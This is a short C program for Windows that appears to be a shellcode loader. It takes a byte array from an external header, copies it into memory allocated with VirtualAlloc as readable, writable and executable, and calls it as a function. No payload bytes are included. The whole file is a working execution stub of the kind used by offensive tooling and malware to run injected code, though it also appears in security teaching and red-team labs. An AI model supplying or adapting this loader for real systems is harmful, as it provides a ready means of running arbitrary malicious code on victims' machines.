#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include <windows.h>
int main( int argc, char *argv[] ) {
    void *exec = VirtualAlloc( 0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    memcpy( exec, shellcode, shellcode_size );
    ( (void ( * )())exec )();
    return 0;
}